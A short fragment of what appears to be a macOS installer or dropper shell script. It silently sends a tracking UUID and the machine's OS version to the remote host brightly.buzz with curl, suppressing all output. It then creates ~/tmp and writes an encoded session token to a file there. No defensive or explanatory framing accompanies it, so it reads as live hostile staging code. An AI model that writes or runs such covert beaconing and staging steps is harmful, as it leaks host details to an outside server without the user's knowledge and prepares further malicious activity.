...
curl -s "https://brightly.buzz/post_info?uuid=07d13b40-7fa7-4781-acb4-d21fabfcfa5c&os=$(/usr/bin/sw_vers -productVersion)" > /dev/null 2>&1

cd ~
mkdir tmp
cd ~/tmp
echo SESSION=Be4A9y3byZoecjIT1cT8H3QGMA+aCy+xSMVxa0GBDKJ6/mc42gG3hf6KPuenmR6iArRlFEng7JvAN2wDZC4VfQ== > context
